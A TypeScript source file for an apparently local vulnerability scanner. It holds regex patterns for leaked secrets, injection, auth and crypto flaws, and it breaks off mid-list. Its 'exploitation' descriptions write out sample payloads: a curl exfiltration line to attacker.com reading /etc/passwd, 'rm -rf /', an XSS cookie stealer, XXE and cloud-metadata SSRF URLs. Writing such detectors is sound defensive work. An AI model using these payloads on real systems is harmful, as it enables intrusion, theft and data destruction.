// kbot Red Team / Blue Team — Adversarial Security Simulation Tools
// Red team: attack surface analysis, vulnerability scanning, exploitation scenarios
// Blue team: hardening recommendations, security checklists, threat modeling
// All operations are local — zero API calls, zero network access.
// Reads source files and pattern-matches for real vulnerabilities.

import { registerTool } from './index.js'
import { homedir } from 'node:os'
import { join, resolve, relative, extname } from 'node:path'
import { existsSync, readFileSync, writeFileSync, mkdirSync, readdirSync, statSync } from 'node:fs'

// ── Types ──────────────────────────────────────────────────────────────────────

interface Finding {
  id: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  category: string
  title: string
  description: string
  file: string
  line: number
  evidence: string
  exploitation: string
  cwe?: string
  remediation?: string
}

interface ScanOptions {
  path: string
  focus: string
  depth: string
}

interface FileEntry {
  path: string
  content: string
  lines: string[]
  ext: string
}

// ── Constants ──────────────────────────────────────────────────────────────────

const SEVERITY_SCORE: Record<string, number> = {
  critical: 10,
  high: 7,
  medium: 4,
  low: 1,
  info: 0,
}

const SEVERITY_COLORS: Record<string, string> = {
  critical: '\u{1F534}',
  high: '\u{1F7E0}',
  medium: '\u{1F7E1}',
  low: '\u{1F535}',
  info: '\u{26AA}',
}

const SOURCE_EXTENSIONS = new Set([
  '.ts', '.js', '.tsx', '.jsx', '.py', '.rb', '.go', '.java',
  '.php', '.rs', '.c', '.cpp', '.cs', '.mjs', '.cjs', '.vue',
  '.svelte', '.astro', '.sh', '.bash', '.zsh', '.yaml', '.yml',
  '.json', '.toml', '.ini', '.cfg', '.conf', '.env', '.xml',
  '.html', '.htm', '.sql', '.graphql', '.gql', '.proto',
  '.dockerfile', '.tf', '.hcl',
])

const SKIP_DIRS = new Set([
  'node_modules', '.git', 'dist', 'build', 'vendor', '.next',
  '__pycache__', '.mypy_cache', '.pytest_cache', 'target', 'out',
  '.gradle', '.idea', '.vscode', 'coverage', '.nyc_output',
  '.turbo', '.vercel', '.netlify', 'venv', '.venv', 'env',
  '.tox', 'bower_components', 'jspm_packages', '.cache',
  '.parcel-cache', '.svelte-kit', '.nuxt', '.output',
])

// Maximum files to scan to prevent hanging on huge repos
const MAX_FILES_QUICK = 200
const MAX_FILES_STANDARD = 1000
const MAX_FILES_DEEP = 5000

// ── File Discovery ─────────────────────────────────────────────────────────────

function resolvePath(p: string): string {
  if (p.startsWith('~/') || p === '~') {
    return resolve(homedir(), p.slice(2) || '.')
  }
  return resolve(p)
}

function collectFiles(dir: string, maxFiles: number): FileEntry[] {
  const files: FileEntry[] = []
  const visited = new Set<string>()

  function walk(currentDir: string, depth: number): void {
    if (files.length >= maxFiles || depth > 15) return
    if (visited.has(currentDir)) return
    visited.add(currentDir)

    let entries: string[]
    try {
      entries = readdirSync(currentDir)
    } catch {
      return
    }

    for (const entry of entries) {
      if (files.length >= maxFiles) return

      const fullPath = join(currentDir, entry)
      let stat
      try {
        stat = statSync(fullPath)
      } catch {
        continue
      }

      if (stat.isDirectory()) {
        if (!SKIP_DIRS.has(entry) && !entry.startsWith('.')) {
          walk(fullPath, depth + 1)
        }
        // Also check dotfiles directories that could have secrets
        if (entry === '.env' || entry === '.aws' || entry === '.ssh') {
          walk(fullPath, depth + 1)
        }
        continue
      }

      if (!stat.isFile()) continue

      const ext = extname(entry).toLowerCase()
      const basename = entry.toLowerCase()

      // Always include these files regardless of extension
      const alwaysInclude = [
        '.env', '.env.local', '.env.development', '.env.production',
        '.env.staging', '.env.test', '.htaccess', '.htpasswd',
        'dockerfile', 'docker-compose.yml', 'docker-compose.yaml',
        'Makefile', 'Rakefile', 'Gemfile', 'requirements.txt',
        'package.json', 'tsconfig.json', 'webpack.config.js',
        'vite.config.ts', 'vite.config.js', 'next.config.js',
        'next.config.mjs', '.npmrc', '.yarnrc', '.babelrc',
        'jest.config.ts', 'jest.config.js', 'vitest.config.ts',
        'nginx.conf', 'apache.conf', 'httpd.conf',
      ]

      if (!SOURCE_EXTENSIONS.has(ext) && !alwaysInclude.includes(basename)) continue

      // Skip large files (> 500KB)
      if (stat.size > 500_000) continue

      try {
        const content = readFileSync(fullPath, 'utf-8')
        // Skip binary files
        if (content.includes('\0')) continue
        files.push({
          path: fullPath,
          content,
          lines: content.split('\n'),
          ext,
        })
      } catch {
        continue
      }
    }
  }

  walk(dir, 0)
  return files
}

// ── Secret Detection Patterns ──────────────────────────────────────────────────

interface SecretPattern {
  name: string
  pattern: RegExp
  severity: 'critical' | 'high' | 'medium' | 'low'
  cwe: string
  description: string
}

const SECRET_PATTERNS: SecretPattern[] = [
  // API Keys — Provider-specific
  {
    name: 'Anthropic API Key',
    pattern: /sk-ant-[a-zA-Z0-9_-]{20,}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Anthropic API key leaked in source code',
  },
  {
    name: 'OpenAI API Key',
    pattern: /sk-[a-zA-Z0-9]{20,}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'OpenAI API key leaked in source code',
  },
  {
    name: 'Stripe Secret Key',
    pattern: /sk_live_[a-zA-Z0-9]{20,}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Stripe live secret key leaked in source code',
  },
  {
    name: 'Stripe Publishable Key (live)',
    pattern: /pk_live_[a-zA-Z0-9]{20,}/g,
    severity: 'medium',
    cwe: 'CWE-798',
    description: 'Stripe live publishable key in source code (less sensitive but still notable)',
  },
  {
    name: 'AWS Access Key',
    pattern: /AKIA[0-9A-Z]{16}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'AWS access key ID found in source code',
  },
  {
    name: 'AWS Secret Key',
    pattern: /(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*['"]?([A-Za-z0-9/+=]{40})['"]?/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'AWS secret access key found in source code',
  },
  {
    name: 'GitHub Personal Access Token',
    pattern: /ghp_[a-zA-Z0-9]{36}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'GitHub personal access token found in source code',
  },
  {
    name: 'GitHub OAuth Token',
    pattern: /gho_[a-zA-Z0-9]{36}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'GitHub OAuth access token found in source code',
  },
  {
    name: 'GitHub Fine-Grained PAT',
    pattern: /github_pat_[a-zA-Z0-9_]{22,}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'GitHub fine-grained personal access token found in source code',
  },
  {
    name: 'Slack Bot Token',
    pattern: /xoxb-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]{20,}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Slack bot token found in source code',
  },
  {
    name: 'Slack User Token',
    pattern: /xoxp-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]{20,}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Slack user token found in source code',
  },
  {
    name: 'Google API Key',
    pattern: /AIza[0-9A-Za-z\-_]{35}/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Google API key found in source code',
  },
  {
    name: 'Google OAuth Client Secret',
    pattern: /(?:client_secret|CLIENT_SECRET)\s*[=:]\s*['"]?([A-Za-z0-9_-]{24,})['"]?/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Google OAuth client secret found in source code',
  },
  {
    name: 'Twilio Auth Token',
    pattern: /(?:TWILIO_AUTH_TOKEN|twilio_auth_token)\s*[=:]\s*['"]?([a-f0-9]{32})['"]?/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Twilio auth token found in source code',
  },
  {
    name: 'SendGrid API Key',
    pattern: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'SendGrid API key found in source code',
  },
  {
    name: 'Mailgun API Key',
    pattern: /key-[a-zA-Z0-9]{32}/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Mailgun API key found in source code',
  },
  {
    name: 'Discord Bot Token',
    pattern: /(?:discord|DISCORD)[\w]*(?:token|TOKEN)\s*[=:]\s*['"]?([A-Za-z0-9._-]{59,})['"]?/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Discord bot token found in source code',
  },
  {
    name: 'Heroku API Key',
    pattern: /(?:HEROKU_API_KEY|heroku_api_key)\s*[=:]\s*['"]?([a-f0-9-]{36,})['"]?/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Heroku API key found in source code',
  },
  {
    name: 'Supabase Service Key',
    pattern: /(?:SUPABASE_SERVICE_KEY|supabase_service_key|service_role_key)\s*[=:]\s*['"]?(eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)['"]?/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Supabase service role key found in source code (full DB access)',
  },
  {
    name: 'Firebase Private Key',
    pattern: /(?:FIREBASE_PRIVATE_KEY|private_key)\s*[=:]\s*['"]?-----BEGIN (?:RSA )?PRIVATE KEY-----/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Firebase private key found in source code',
  },

  // Generic Secrets
  {
    name: 'Hardcoded Password',
    pattern: /(?:password|passwd|pass|pwd)\s*[=:]\s*['"][^'"]{4,}['"]/gi,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Hardcoded password found in source code',
  },
  {
    name: 'Hardcoded Secret',
    pattern: /(?:secret|SECRET)\s*[=:]\s*['"][^'"]{8,}['"]/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Hardcoded secret value found in source code',
  },
  {
    name: 'Hardcoded Token',
    pattern: /(?:token|TOKEN|api_key|API_KEY|apiKey|apikey)\s*[=:]\s*['"][^'"]{10,}['"]/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Hardcoded API token or key found in source code',
  },
  {
    name: 'Hardcoded Credential',
    pattern: /(?:credential|credentials|auth_token|access_token|refresh_token)\s*[=:]\s*['"][^'"]{8,}['"]/gi,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Hardcoded credential found in source code',
  },

  // Private Keys
  {
    name: 'RSA Private Key',
    pattern: /-----BEGIN RSA PRIVATE KEY-----/g,
    severity: 'critical',
    cwe: 'CWE-321',
    description: 'RSA private key found in source code',
  },
  {
    name: 'OpenSSH Private Key',
    pattern: /-----BEGIN OPENSSH PRIVATE KEY-----/g,
    severity: 'critical',
    cwe: 'CWE-321',
    description: 'OpenSSH private key found in source code',
  },
  {
    name: 'EC Private Key',
    pattern: /-----BEGIN EC PRIVATE KEY-----/g,
    severity: 'critical',
    cwe: 'CWE-321',
    description: 'EC private key found in source code',
  },
  {
    name: 'PGP Private Key',
    pattern: /-----BEGIN PGP PRIVATE KEY BLOCK-----/g,
    severity: 'critical',
    cwe: 'CWE-321',
    description: 'PGP private key found in source code',
  },
  {
    name: 'Generic Private Key',
    pattern: /-----BEGIN PRIVATE KEY-----/g,
    severity: 'critical',
    cwe: 'CWE-321',
    description: 'Private key found in source code',
  },

  // Connection Strings
  {
    name: 'MongoDB Connection String',
    pattern: /mongodb(?:\+srv)?:\/\/[a-zA-Z0-9._-]+:[^@\s]+@[a-zA-Z0-9._-]+/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'MongoDB connection string with credentials found in source code',
  },
  {
    name: 'PostgreSQL Connection String',
    pattern: /postgres(?:ql)?:\/\/[a-zA-Z0-9._-]+:[^@\s]+@[a-zA-Z0-9._-]+/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'PostgreSQL connection string with credentials found in source code',
  },
  {
    name: 'MySQL Connection String',
    pattern: /mysql:\/\/[a-zA-Z0-9._-]+:[^@\s]+@[a-zA-Z0-9._-]+/g,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'MySQL connection string with credentials found in source code',
  },
  {
    name: 'Redis Connection String',
    pattern: /redis:\/\/[^@\s]*:[^@\s]+@[a-zA-Z0-9._-]+/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Redis connection string with credentials found in source code',
  },
  {
    name: 'AMQP Connection String',
    pattern: /amqps?:\/\/[a-zA-Z0-9._-]+:[^@\s]+@[a-zA-Z0-9._-]+/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'AMQP/RabbitMQ connection string with credentials found in source code',
  },

  // JWT tokens
  {
    name: 'JWT Token (hardcoded)',
    pattern: /['"]eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}['"]/g,
    severity: 'high',
    cwe: 'CWE-798',
    description: 'Hardcoded JWT token found in source code',
  },

  // .env file committed
  {
    name: 'Env File in Source',
    pattern: /^[A-Z_]+=.{10,}$/gm,
    severity: 'medium',
    cwe: 'CWE-798',
    description: 'Potential environment variable with secret value',
  },
]

// ── Injection Detection Patterns ───────────────────────────────────────────────

interface InjectionPattern {
  name: string
  category: string
  pattern: RegExp
  severity: 'critical' | 'high' | 'medium' | 'low'
  cwe: string
  description: string
  exploitation: string
}

const INJECTION_PATTERNS: InjectionPattern[] = [
  // SQL Injection
  {
    name: 'SQL String Concatenation',
    category: 'SQL Injection',
    pattern: /(?:query|execute|sql|sequelize\.query|knex\.raw|prisma\.\$queryRaw)\s*\(\s*['"`]?\s*(?:SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC|UNION)\b[^)]*\+/gi,
    severity: 'critical',
    cwe: 'CWE-89',
    description: 'SQL query built with string concatenation — direct SQL injection vector',
    exploitation: 'Attacker injects SQL via concatenated input: " OR 1=1 --" to extract all records, or "; DROP TABLE users --" for data destruction',
  },
  {
    name: 'SQL Template Literal with Variable',
    category: 'SQL Injection',
    pattern: /(?:query|execute|sql|sequelize\.query|knex\.raw|prisma\.\$queryRawUnsafe)\s*\(\s*`[^`]*\$\{[^}]*(?:req\.|params\.|query\.|body\.|args\.|input|user)[^}]*\}[^`]*`/gi,
    severity: 'critical',
    cwe: 'CWE-89',
    description: 'SQL query built with template literal containing user input',
    exploitation: 'Template literals are NOT parameterized — attacker can inject SQL through interpolated variables',
  },
  {
    name: 'Raw SQL with Format String',
    category: 'SQL Injection',
    pattern: /(?:format|sprintf|f['"])\s*(?:.*?)(?:SELECT|INSERT|UPDATE|DELETE|DROP)/gi,
    severity: 'critical',
    cwe: 'CWE-89',
    description: 'SQL query built with format strings',
    exploitation: 'Format strings in SQL queries allow injection through format parameters',
  },
  {
    name: 'NoSQL Injection ($where)',
    category: 'NoSQL Injection',
    pattern: /\$where\s*:\s*.*(?:req\.|params\.|query\.|body\.|args\.|input|user)/gi,
    severity: 'critical',
    cwe: 'CWE-943',
    description: 'MongoDB $where operator with user input allows arbitrary JavaScript execution',
    exploitation: 'Attacker sends {$where: "this.password == \'x\' || true"} to bypass auth or exfiltrate data',
  },
  {
    name: 'NoSQL Injection ($regex)',
    category: 'NoSQL Injection',
    pattern: /\$regex\s*:\s*.*(?:req\.|params\.|query\.|body\.|args\.|input|user)/gi,
    severity: 'high',
    cwe: 'CWE-943',
    description: 'MongoDB $regex with user input — can cause ReDoS or data leak',
    exploitation: 'Attacker crafts malicious regex for denial of service or substring extraction via timing attack',
  },

  // XSS
  {
    name: 'innerHTML Assignment',
    category: 'XSS',
    pattern: /\.innerHTML\s*=\s*(?!['"]<(?:br|hr|div|span|p)\s*\/?>['"])/g,
    severity: 'high',
    cwe: 'CWE-79',
    description: 'Direct innerHTML assignment — XSS vector if user-controlled',
    exploitation: 'Attacker injects <script>alert(document.cookie)</script> or <img onerror=...> to steal session tokens',
  },
  {
    name: 'dangerouslySetInnerHTML',
    category: 'XSS',
    pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:/g,
    severity: 'high',
    cwe: 'CWE-79',
    description: 'React dangerouslySetInnerHTML — XSS vector if content is user-controlled',
    exploitation: 'Bypasses React XSS protection — attacker injects malicious HTML/JS into rendered content',
  },
  {
    name: 'document.write',
    category: 'XSS',
    pattern: /document\.write\s*\(/g,
    severity: 'high',
    cwe: 'CWE-79',
    description: 'document.write usage — DOM-based XSS vector',
    exploitation: 'Attacker controls input to document.write, injecting arbitrary HTML/JS into the page',
  },
  {
    name: 'eval() Usage',
    category: 'Code Injection',
    pattern: /(?<!\w)eval\s*\(/g,
    severity: 'critical',
    cwe: 'CWE-95',
    description: 'eval() allows arbitrary code execution',
    exploitation: 'Attacker injects malicious JavaScript through eval input — full RCE in Node.js, session hijack in browser',
  },
  {
    name: 'Function() Constructor',
    category: 'Code Injection',
    pattern: /new\s+Function\s*\(/g,
    severity: 'critical',
    cwe: 'CWE-95',
    description: 'Function constructor allows arbitrary code execution (equivalent to eval)',
    exploitation: 'new Function("return " + userInput)() allows arbitrary code execution',
  },
  {
    name: 'setTimeout/setInterval with String',
    category: 'Code Injection',
    pattern: /(?:setTimeout|setInterval)\s*\(\s*['"`]/g,
    severity: 'medium',
    cwe: 'CWE-95',
    description: 'setTimeout/setInterval with string argument acts like eval',
    exploitation: 'String argument to setTimeout is evaluated as code — injection point if user-controlled',
  },
  {
    name: 'jQuery .html() with Variable',
    category: 'XSS',
    pattern: /\.html\s*\(\s*(?!['"])[a-zA-Z$_]/g,
    severity: 'high',
    cwe: 'CWE-79',
    description: 'jQuery .html() with variable — XSS if user-controlled',
    exploitation: 'Attacker injects HTML/JS through variable passed to jQuery .html()',
  },
  {
    name: 'Unescaped Template Output',
    category: 'XSS',
    pattern: /\{\{\{[^}]*\}\}\}|<%[-=]?\s*(?!-)/g,
    severity: 'medium',
    cwe: 'CWE-79',
    description: 'Unescaped template output (Handlebars {{{}}}, ERB <%=)',
    exploitation: 'Unescaped template rendering allows XSS if variable contains user input',
  },

  // Command Injection
  {
    name: 'exec() with Variable',
    category: 'Command Injection',
    pattern: /(?:exec|execSync)\s*\(\s*(?!['"`](?:npm|node|git|tsc|vitest|jest|eslint|prettier|ls|cat|echo|mkdir|rm|cp|mv|chmod|chown|pwd|whoami|which|date|curl|wget)\b)[^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user|\$\{|\+\s*[a-zA-Z])/gi,
    severity: 'critical',
    cwe: 'CWE-78',
    description: 'Shell command execution with user-controlled input',
    exploitation: 'Attacker injects shell commands: input = "; rm -rf / #" or "`curl attacker.com/steal?d=$(cat /etc/passwd)`"',
  },
  {
    name: 'spawn() with User Input',
    category: 'Command Injection',
    pattern: /(?:spawn|spawnSync|fork)\s*\(\s*(?:[^,)]*(?:req\.|params\.|query\.|body\.|args\.|input|user))/gi,
    severity: 'critical',
    cwe: 'CWE-78',
    description: 'Process spawn with user-controlled command or arguments',
    exploitation: 'Attacker controls command arguments to execute arbitrary programs or read files',
  },
  {
    name: 'child_process with Template Literal',
    category: 'Command Injection',
    pattern: /(?:exec|execSync|execFile|execFileSync)\s*\(\s*`[^`]*\$\{/g,
    severity: 'high',
    cwe: 'CWE-78',
    description: 'Shell command built with template literal interpolation',
    exploitation: 'Template literals in shell commands allow command injection via interpolated variables',
  },
  {
    name: 'subprocess.run (Python)',
    category: 'Command Injection',
    pattern: /subprocess\.(?:run|call|Popen|check_output|check_call)\s*\(\s*(?:f['"]|.*\.format|.*%\s*(?:\(|[a-zA-Z]))/g,
    severity: 'critical',
    cwe: 'CWE-78',
    description: 'Python subprocess with format string — command injection vector',
    exploitation: 'Attacker injects shell commands through formatted string arguments',
  },
  {
    name: 'os.system (Python)',
    category: 'Command Injection',
    pattern: /os\.system\s*\(/g,
    severity: 'high',
    cwe: 'CWE-78',
    description: 'Python os.system is inherently unsafe — runs commands through shell',
    exploitation: 'Any user input in os.system argument allows arbitrary command execution',
  },

  // Path Traversal
  {
    name: 'Path Traversal (join with user input)',
    category: 'Path Traversal',
    pattern: /(?:path\.join|path\.resolve|join|resolve)\s*\([^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user)[^)]*\)/gi,
    severity: 'high',
    cwe: 'CWE-22',
    description: 'File path constructed with user input without traversal check',
    exploitation: 'Attacker sends "../../../etc/passwd" to read arbitrary files outside intended directory',
  },
  {
    name: 'Direct File Read with User Input',
    category: 'Path Traversal',
    pattern: /(?:readFile|readFileSync|createReadStream|open)\s*\(\s*(?:[^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user))/gi,
    severity: 'high',
    cwe: 'CWE-22',
    description: 'File read operation with user-controlled path',
    exploitation: 'Attacker reads sensitive files: /etc/passwd, /proc/self/environ, config files with credentials',
  },
  {
    name: 'File Write with User Path',
    category: 'Path Traversal',
    pattern: /(?:writeFile|writeFileSync|createWriteStream)\s*\(\s*(?:[^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user))/gi,
    severity: 'critical',
    cwe: 'CWE-22',
    description: 'File write operation with user-controlled path',
    exploitation: 'Attacker writes to arbitrary locations: overwrite .bashrc, crontab, authorized_keys for RCE',
  },

  // SSRF
  {
    name: 'SSRF (fetch with user URL)',
    category: 'SSRF',
    pattern: /(?:fetch|axios|got|request|http\.get|https\.get|urllib\.request)\s*\(\s*(?:[^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user|url))/gi,
    severity: 'high',
    cwe: 'CWE-918',
    description: 'HTTP request with user-controlled URL — SSRF vector',
    exploitation: 'Attacker targets internal services: http://169.254.169.254/latest/meta-data/ (AWS), http://localhost:6379/ (Redis)',
  },
  {
    name: 'SSRF (redirect follow)',
    category: 'SSRF',
    pattern: /(?:redirect|follow)\s*:\s*true|(?:maxRedirects|max_redirects)\s*:\s*(?:[5-9]|[1-9]\d)/gi,
    severity: 'medium',
    cwe: 'CWE-918',
    description: 'HTTP client follows redirects — can be chained with SSRF',
    exploitation: 'Attacker provides URL that 302-redirects to internal service, bypassing URL validation',
  },

  // Template Injection
  {
    name: 'Server-Side Template Injection',
    category: 'Template Injection',
    pattern: /(?:render|template|compile)\s*\(\s*(?:[^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user))/gi,
    severity: 'critical',
    cwe: 'CWE-94',
    description: 'Template engine render with user-controlled template string',
    exploitation: 'Attacker injects template syntax: {{7*7}} in Jinja2, ${7*7} in FreeMarker — leads to RCE',
  },

  // LDAP Injection
  {
    name: 'LDAP Injection',
    category: 'LDAP Injection',
    pattern: /(?:ldap|LDAP).*(?:search|bind|query)\s*\([^)]*(?:req\.|params\.|query\.|body\.|args\.|input|user)/gi,
    severity: 'high',
    cwe: 'CWE-90',
    description: 'LDAP query with user-controlled input',
    exploitation: 'Attacker injects LDAP filter: *)(&(objectClass=*) to enumerate all objects or bypass auth',
  },

  // Deserialization
  {
    name: 'Unsafe Deserialization (JSON.parse of user input)',
    category: 'Deserialization',
    pattern: /JSON\.parse\s*\(\s*(?:req\.body|params|query|input|user)/gi,
    severity: 'medium',
    cwe: 'CWE-502',
    description: 'JSON.parse of raw user input without schema validation',
    exploitation: 'While JSON.parse itself is safe, parsed objects may contain __proto__ pollution or unexpected types',
  },
  {
    name: 'Prototype Pollution',
    category: 'Prototype Pollution',
    pattern: /(?:__proto__|constructor\.prototype|Object\.assign\s*\(\s*\{\}|\.\.\.(?:req\.|params\.|query\.|body\.|args\.|input))/gi,
    severity: 'high',
    cwe: 'CWE-1321',
    description: 'Potential prototype pollution via __proto__ or unguarded Object.assign/spread',
    exploitation: 'Attacker sends {"__proto__":{"isAdmin":true}} to pollute Object prototype and escalate privileges',
  },
  {
    name: 'Unsafe YAML/Pickle Deserialization',
    category: 'Deserialization',
    pattern: /(?:yaml\.load|pickle\.loads?|marshal\.loads?|shelve\.open)\s*\(/g,
    severity: 'critical',
    cwe: 'CWE-502',
    description: 'Unsafe deserialization can lead to remote code execution',
    exploitation: 'Attacker crafts malicious YAML/pickle payload that executes arbitrary code on deserialization',
  },

  // XML External Entity
  {
    name: 'XXE (XML External Entity)',
    category: 'XXE',
    pattern: /(?:parseXML|xml2js|DOMParser|SAXParser|XMLReader|etree\.parse)\s*\(/g,
    severity: 'medium',
    cwe: 'CWE-611',
    description: 'XML parsing without explicit XXE protection',
    exploitation: 'Attacker injects XML with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
  },

  // Open Redirect
  {
    name: 'Open Redirect',
    category: 'Open Redirect',
    pattern: /(?:res\.redirect|response\.redirect|redirect)\s*\(\s*(?:req\.|params\.|query\.|body\.|args\.|input|user)/gi,
    severity: 'medium',
    cwe: 'CWE-601',
    description: 'Redirect with user-controlled URL — open redirect vector',
    exploitation: 'Attacker crafts phishing URL: yoursite.com/redirect?url=evil.com/login to steal credentials',
  },

  // Header Injection
  {
    name: 'HTTP Header Injection',
    category: 'Header Injection',
    pattern: /(?:res\.setHeader|res\.header|response\.setHeader|set_header)\s*\(\s*[^,]+,\s*(?:req\.|params\.|query\.|body\.|args\.|input|user)/gi,
    severity: 'high',
    cwe: 'CWE-113',
    description: 'HTTP header set with user-controlled value',
    exploitation: 'Attacker injects CRLF to add arbitrary headers or split the response for cache poisoning',
  },

  // Regex DoS
  {
    name: 'Regex DoS (ReDoS)',
    category: 'ReDoS',
    pattern: /new\s+RegExp\s*\(\s*(?:req\.|params\.|query\.|body\.|args\.|input|user)/gi,
    severity: 'medium',
    cwe: 'CWE-1333',
    description: 'Regular expression constructed from user input — ReDoS vector',
    exploitation: 'Attacker crafts catastrophic backtracking regex input to cause CPU exhaustion (denial of service)',
  },
]

// ── Auth Issue Patterns ────────────────────────────────────────────────────────

interface AuthPattern {
  name: string
  pattern: RegExp
  antiPattern?: RegExp
  severity: 'critical' | 'high' | 'medium' | 'low'
  cwe: string
  description: string
}

const AUTH_PATTERNS: AuthPattern[] = [
  {
    name: 'Hardcoded JWT Secret',
    pattern: /(?:jwt\.sign|jwt\.verify|jsonwebtoken\.sign)\s*\([^)]*,\s*['"][^'"]{4,}['"]/gi,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'JWT signed/verified with hardcoded secret — compromise affects all tokens',
  },
  {
    name: 'Weak JWT Secret',
    pattern: /(?:JWT_SECRET|jwt_secret|jwtSecret)\s*[=:]\s*['"](?:secret|password|123|test|dev|admin|key)['"]/gi,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'JWT secret is a weak/default value — trivially guessable',
  },
  {
    name: 'JWT None Algorithm',
    pattern: /(?:algorithm|algorithms)\s*[=:]\s*(?:\[?\s*['"]none['"]|\['none')/gi,
    severity: 'critical',
    cwe: 'CWE-327',
    description: 'JWT allows "none" algorithm — tokens can be forged without a key',
  },
  {
    name: 'Missing Auth Middleware (Express)',
    pattern: /(?:app|router)\.(?:get|post|put|patch|delete)\s*\(\s*['"][^'"]*(?:admin|user|account|profile|settings|dashboard|api\/v)[^'"]*['"]\s*,\s*(?:async\s+)?\(?(?:req|request)/gi,
    antiPattern: /(?:auth|authenticate|isAuthenticated|requireAuth|protect|guard|verify|middleware|passport)/gi,
    severity: 'high',
    cwe: 'CWE-306',
    description: 'Route handler for sensitive endpoint without visible auth middleware',
  },
  {
    name: 'Missing Rate Limiting',
    pattern: /(?:app|router)\.(?:post)\s*\(\s*['"][^'"]*(?:login|signin|auth|register|signup|reset|forgot|verify|otp|2fa|token)[^'"]*['"]/gi,
    antiPattern: /(?:rateLimit|rateLimiter|limiter|throttle|slowDown|express-rate-limit|rate_limit)/gi,
    severity: 'medium',
    cwe: 'CWE-307',
    description: 'Auth-related POST endpoint without visible rate limiting',
  },
  {
    name: 'Insecure Cookie (no httpOnly)',
    pattern: /(?:res\.cookie|set-cookie|setCookie)\s*\([^)]*(?!httpOnly)/gi,
    severity: 'medium',
    cwe: 'CWE-1004',
    description: 'Cookie set without httpOnly flag — accessible to JavaScript (XSS can steal it)',
  },
  {
    name: 'Insecure Cookie (no secure flag)',
    pattern: /(?:res\.cookie|setCookie)\s*\(\s*[^)]*(?:httpOnly|HttpOnly)[^)]*(?!secure)/gi,
    severity: 'medium',
    cwe: 'CWE-614',
    description: 'Cookie without secure flag — transmitted over unencrypted HTTP',
  },
  {
    name: 'Session Fixation',
    pattern: /(?:req\.session|session)\s*=\s*(?:req\.query|req\.params|req\.body)/gi,
    severity: 'high',
    cwe: 'CWE-384',
    description: 'Session assigned from user input — session fixation vulnerability',
  },
  {
    name: 'Missing CSRF Protection',
    pattern: /(?:app\.post|router\.post)\s*\(\s*['"][^'"]*(?:transfer|payment|delete|update|change|submit)[^'"]*['"]/gi,
    antiPattern: /(?:csrf|csrfToken|csurf|_csrf|xsrf|CSRF)/gi,
    severity: 'medium',
    cwe: 'CWE-352',
    description: 'State-changing POST endpoint without visible CSRF protection',
  },
  {
    name: 'Weak Password Validation',
    pattern: /(?:password|passwd)\.(?:length|trim)\s*(?:>=?|<=?|===?|!==?)\s*(?:[1-5])\b/gi,
    severity: 'medium',
    cwe: 'CWE-521',
    description: 'Password length requirement too short (should be >= 8, preferably >= 12)',
  },
  {
    name: 'Basic Auth over HTTP',
    pattern: /(?:Authorization|authorization)\s*[=:]\s*['"]Basic\s/g,
    severity: 'high',
    cwe: 'CWE-319',
    description: 'Basic authentication — credentials sent in base64 (easily decoded)',
  },
  {
    name: 'Disabled Auth Check',
    pattern: /(?:\/\/\s*TODO|\/\/\s*FIXME|\/\/\s*HACK|\/\/\s*TEMPORARY)\s*.*(?:auth|authentication|authorization)/gi,
    severity: 'medium',
    cwe: 'CWE-306',
    description: 'Commented-out or TODO auth check — likely a security gap',
  },
]

// ── Crypto Issue Patterns ──────────────────────────────────────────────────────

interface CryptoPattern {
  name: string
  pattern: RegExp
  severity: 'critical' | 'high' | 'medium' | 'low'
  cwe: string
  description: string
}

const CRYPTO_PATTERNS: CryptoPattern[] = [
  {
    name: 'MD5 for Password Hashing',
